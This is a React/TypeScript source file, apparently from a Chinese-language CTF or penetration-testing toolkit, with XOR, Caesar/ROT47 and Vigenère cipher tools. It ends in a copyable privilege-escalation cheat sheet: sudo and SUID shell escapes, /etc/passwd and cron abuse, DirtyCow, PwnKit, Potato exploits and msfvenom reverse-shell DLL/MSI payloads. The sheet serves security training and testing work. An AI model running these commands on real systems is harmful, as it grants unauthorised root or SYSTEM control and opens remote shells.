import React, { useState, useMemo } from 'react'
import { Panel, Btn, TA, Input, Select, ErrorNote, CopyBtn } from '../components/ui'

/* ================= XOR ================= */

function xorBytes(data: Uint8Array, key: Uint8Array): Uint8Array {
  if (!key.length) return data
  const out = new Uint8Array(data.length)
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ key[i % key.length]
  return out
}
const toHex = (b: Uint8Array) => Array.from(b, x => x.toString(16).padStart(2, '0')).join('')
const fromHex = (s: string): Uint8Array => {
  const clean = s.replace(/[^0-9a-f]/gi, '')
  const out = new Uint8Array(clean.length / 2)
  for (let i = 0; i < out.length; i++) out[i] = parseInt(clean.slice(i * 2, i * 2 + 2), 16)
  return out
}

export function XorTool() {
  const [input, setInput] = useState('flag{xor_1s_fun}')
  const [key, setKey] = useState('key')
  const [keyIsHex, setKeyIsHex] = useState(false)
  const [inputIsHex, setInputIsHex] = useState(false)

  const result = useMemo(() => {
    if (!input || !key) return null
    try {
      const data = inputIsHex ? fromHex(input) : new TextEncoder().encode(input)
      const k = keyIsHex ? fromHex(key) : new TextEncoder().encode(key)
      const out = xorBytes(data, k)
      let printable = ''
      try {
        printable = new TextDecoder('utf-8', { fatal: true }).decode(out)
      } catch { printable = '(非可打印输出，请看 Hex)' }
      return { hex: toHex(out), text: printable }
    } catch (e) {
      return { error: (e as Error).message }
    }
  }, [input, key, keyIsHex, inputIsHex])

  return (
    <div className="space-y-3">
      <TA value={input} onChange={setInput} label="输入数据" rows={4} />
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
        <Input value={key} onChange={setKey} label="XOR 密钥" placeholder="key 或 6b6579" />
        <div className="flex items-end gap-4 pb-1.5">
          <label className="flex items-center gap-1.5 text-[12px] text-muted cursor-pointer">
            <input type="checkbox" checked={inputIsHex} onChange={e => setInputIsHex(e.target.checked)} className="accent-phosphor" /> 输入是 Hex
          </label>
          <label className="flex items-center gap-1.5 text-[12px] text-muted cursor-pointer">
            <input type="checkbox" checked={keyIsHex} onChange={e => setKeyIsHex(e.target.checked)} className="accent-phosphor" /> 密钥是 Hex
          </label>
        </div>
      </div>
      {result && 'error' in result && <ErrorNote msg={result.error!} />}
      {result && !('error' in result) && (
        <div className="space-y-2">
          <TA value={result.text} readOnly label="文本结果" rows={3} />
          <TA value={result.hex} readOnly label="Hex 结果" rows={2} />
        </div>
      )}
      <p className="text-[11px] text-muted">* XOR 是可逆运算：同一密钥再异或一次即还原。循环使用密钥（Vernam 变体）。</p>
    </div>
  )
}

/* ================= ROT / 凯撒 ================= */

function caesar(s: string, shift: number): string {
  return s.split('').map(c => {
    const code = c.charCodeAt(0)
    if (code >= 65 && code <= 90) return String.fromCharCode((code - 65 + shift + 26) % 26 + 65)
    if (code >= 97 && code <= 122) return String.fromCharCode((code - 97 + shift + 26) % 26 + 97)
    return c
  }).join('')
}
function rot47(s: string): string {
  return s.split('').map(c => {
    const code = c.charCodeAt(0)
    return code >= 33 && code <= 126 ? String.fromCharCode(33 + ((code - 33 + 47) % 94)) : c
  }).join('')
}

export function RotTool() {
  const [input, setInput] = useState('Uryyb Jbeyq')
  const [shift, setShift] = useState('13')
  const [brute, setBrute] = useState(false)

  const output = useMemo(() => caesar(input, parseInt(shift) || 0), [input, shift])
  const r47 = useMemo(() => rot47(input), [input])
  const bruteList = useMemo(() => {
    if (!brute || !input) return null
    return Array.from({ length: 25 }, (_, i) => ({ n: i + 1, text: caesar(input, i + 1) }))
  }, [brute, input])

  return (
    <div className="space-y-3">
      <TA value={input} onChange={setInput} label="输入" rows={4} />
      <div className="flex gap-3 items-end flex-wrap">
        <Input value={shift} onChange={setShift} label="位移量 (1-25)" type="number" className="w-36" />
        <Btn variant="primary" onClick={() => {}} disabled className="invisible">占位</Btn>
        <label className="flex items-center gap-1.5 text-[12px] text-muted cursor-pointer pb-1.5">
          <input type="checkbox" checked={brute} onChange={e => setBrute(e.target.checked)} className="accent-phosphor" /> 爆破全部 25 种位移
        </label>
      </div>
      {!brute && (
        <div className="space-y-2">
          <TA value={output} readOnly label={`凯撒位移 ${shift}（ROT13 即位移 13，自逆）`} rows={3} />
          <TA value={r47} readOnly label="ROT47（覆盖全部可打印 ASCII，自逆）" rows={2} />
        </div>
      )}
      {brute && bruteList && (
        <div className="border border-line-soft bg-panel-2 max-h-[420px] overflow-auto">
          {bruteList.map(b => (
            <div key={b.n} className="flex gap-3 px-3 py-1.5 border-b border-line-soft last:border-0 text-[12px] hover:bg-phosphor-faint">
              <span className="text-muted w-14 shrink-0">ROT-{b.n}</span>
              <span className="text-bright break-all">{b.text}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

/* ================= 维吉尼亚 ================= */

function vigenere(text: string, key: string, decrypt = false): string {
  const k = key.toLowerCase().replace(/[^a-z]/g, '')
  if (!k) return text
  let ki = 0
  return text.split('').map(c => {
    const code = c.charCodeAt(0)
    const isUpper = code >= 65 && code <= 90
    const isLower = code >= 97 && code <= 122
    if (!isUpper && !isLower) return c
    const shift = k.charCodeAt(ki % k.length) - 97
    ki++
    const base = isUpper ? 65 : 97
    const offset = decrypt ? 26 - shift : shift
    return String.fromCharCode((code - base + offset) % 26 + base)
  }).join('')
}

export function VigenereTool() {
  const [input, setInput] = useState('ATTACKATDAWN')
  const [key, setKey] = useState('LEMON')
  const [output, setOutput] = useState('')
  const [mode, setMode] = useState<'enc' | 'dec'>('enc')

  const run = (m: 'enc' | 'dec') => {
    setMode(m)
    setOutput(vigenere(input, key, m === 'dec'))
  }

  return (
    <div className="space-y-3">
      <TA value={input} onChange={setInput} label="文本（仅处理 a-z，忽略其他字符）" rows={4} />
      <Input value={key} onChange={setKey} label="密钥（字母）" placeholder="LEMON" />
      <div className="flex gap-2">
        <Btn variant="primary" onClick={() => run('enc')}>加密</Btn>
        <Btn onClick={() => run('dec')}>解密</Btn>
      </div>
      {output && <TA value={output} readOnly label={mode === 'enc' ? '密文' : '明文'} rows={3} />}
      <p className="text-[11px] text-muted">* 经典多表替换密码（1553年），曾被称为"不可破译的密码"，1863 年被 Kasiski 检验攻破。</p>
    </div>
  )
}

/* ================= 提权速查 ================= */

type PrivGroup = { name: string; items: { label: string; cmd: string; note?: string }[] }

const PRIVESC: PrivGroup[] = [
  {
    name: 'Linux · 信息收集',
    items: [
      { label: '一键枚举', cmd: `linpeas.sh | tee /tmp/lp.txt`, note: 'LinPEAS 全面枚举' },
      { label: '内核与发行版', cmd: `uname -a && cat /etc/os-release` },
      { label: 'sudo 权限', cmd: `sudo -l`, note: '重点找 NOPASSWD 与通配符' },
      { label: 'SUID 文件', cmd: `find / -perm -4000 -type f 2>/dev/null` },
      { label: 'SGID 文件', cmd: `find / -perm -2000 -type f 2>/dev/null` },
      { label: '可写关键文件', cmd: `find /etc -writable -type f 2>/dev/null` },
      { label: '计划任务', cmd: `cat /etc/crontab; ls -la /etc/cron.d/` },
      { label: 'capabilities', cmd: `getcap -r / 2>/dev/null`, note: 'cap_setuid 类等同 root' },
      { label: '历史命令中的密码', cmd: `cat ~/.bash_history | grep -iE "pass|mysql|ssh"` },
    ],
  },
  {
    name: 'Linux · 常见利用',
    items: [
      { label: 'sudo find 提权', cmd: `sudo find . -exec /bin/sh \\; -quit`, note: 'find 在 sudo -l 中' },
      { label: 'sudo vim 提权', cmd: `sudo vim -c ':!/bin/sh'` },
      { label: 'sudo awk 提权', cmd: `sudo awk 'BEGIN {system("/bin/sh")}'` },
      { label: 'sudo nmap 提权', cmd: `echo "os.execute('/bin/sh')" > /tmp/x.nse && sudo nmap --script=/tmp/x.nse` },
      { label: 'SUID bash', cmd: `./bash -p`, note: '-p 保留 euid' },
      { label: 'SUID python', cmd: `./python -c 'import os; os.setuid(0); os.system("/bin/sh")'` },
      { label: '可写 /etc/passwd', cmd: `openssl passwd -1 'hacked'  # 生成哈希后写入 root 行`, note: '或新增 uid=0 用户' },
      { label: 'cron 通配符注入', cmd: `echo 'chmod u+s /bin/bash' > /tmp/run.sh`, note: 'root 定时任务执行可写脚本' },
      { label: 'NFS no_root_squash', cmd: `showmount -e <ip>  # 挂载后放 SUID 二进制` },
      { label: 'DirtyCow (CVE-2016-5195)', cmd: `./dirty /usr/bin/passwd`, note: '内核 2.6.22 ~ 4.8.3' },
      { label: 'PwnKit (CVE-2021-4034)', cmd: `./PwnKit`, note: 'polkit pkexec，影响面极广' },
    ],
  },
  {
    name: 'Windows · 信息收集',
    items: [
      { label: '一键枚举', cmd: `winPEASx64.exe`, note: 'WinPEAS' },
      { label: '系统信息', cmd: `systeminfo | findstr /B /C:"OS"`, note: '找缺失补丁' },
      { label: '当前权限', cmd: `whoami /all`, note: '关注 SeImpersonate 等特权' },
      { label: '未加引号服务路径', cmd: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"`, note: 'Unquoted Service Path' },
      { label: '可修改的服务', cmd: `accesschk.exe -uwcqv "Authenticated Users" * /accepteula` },
      { label: '注册表自动运行', cmd: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` },
      { label: '存储的凭据', cmd: `cmdkey /list` },
      { label: 'AlwaysInstallElevated', cmd: `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`, note: '值为 1 则 msi 以 SYSTEM 安装' },
    ],
  },
  {
    name: 'Windows · 常见利用',
    items: [
      { label: 'PrintSpoofer', cmd: `PrintSpoofer64.exe -i -c cmd`, note: '需 SeImpersonate（服务账户常见）' },
      { label: 'JuicyPotato', cmd: `JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *`, note: 'Win 2016/10 之前' },
      { label: 'GodPotato', cmd: `GodPotato.exe -cmd "cmd /c whoami"`, note: 'Win 2012-2022 通用' },
      { label: 'RoguePotato', cmd: `RoguePotato.exe -r <攻击机IP> -e rev.exe -l 9999`, note: 'PrintSpooler 被禁用时' },
      { label: '服务路径注入', cmd: `icacls "C:\\Program Files\\Svc Dir\\"  # 在空格处放 Program.exe`, note: '配合未加引号服务路径' },
      { label: 'DLL 劫持', cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f dll > hijack.dll` },
      { label: 'msi 提权', cmd: `msfvenom -p windows/x64/shell_reverse_tcp -f msi > evil.msi && msiexec /quiet /qn /i evil.msi`, note: 'AlwaysInstallElevated' },
    ],
  },
]

export function PrivescTool() {
  const [filter, setFilter] = useState('')
  const filtered = useMemo(() => {
    if (!filter.trim()) return PRIVESC
    const q = filter.toLowerCase()
    return PRIVESC.map(g => ({
      ...g,
      items: g.items.filter(i =>
        i.label.toLowerCase().includes(q) || i.cmd.toLowerCase().includes(q) || (i.note || '').toLowerCase().includes(q)),
    })).filter(g => g.items.length > 0)
  }, [filter])

  return (
    <div className="space-y-3">
      <Input value={filter} onChange={setFilter} label="筛选" placeholder="sudo / potato / suid / cron..." />
      {filtered.map(g => (
        <Panel key={g.name} title={g.name}>
          <div className="space-y-1.5">
            {g.items.map((it, i) => (
              <div key={i} className="flex flex-col sm:flex-row sm:items-start justify-between gap-2 sm:gap-3 border border-line-soft bg-panel-2 px-3 py-2">
                <div className="min-w-0">
                  <div className="text-[11px] text-muted">{it.label}{it.note ? ` · ${it.note}` : ''}</div>
                  <code className="text-[12.5px] text-phosphor break-all">{it.cmd}</code>
                </div>
                <CopyBtn text={it.cmd} className="shrink-0 mt-0.5 self-start" />
              </div>
            ))}
          </div>
        </Panel>
      ))}
      {filtered.length === 0 && <ErrorNote msg="没有匹配的条目" />}
    </div>
  )
}
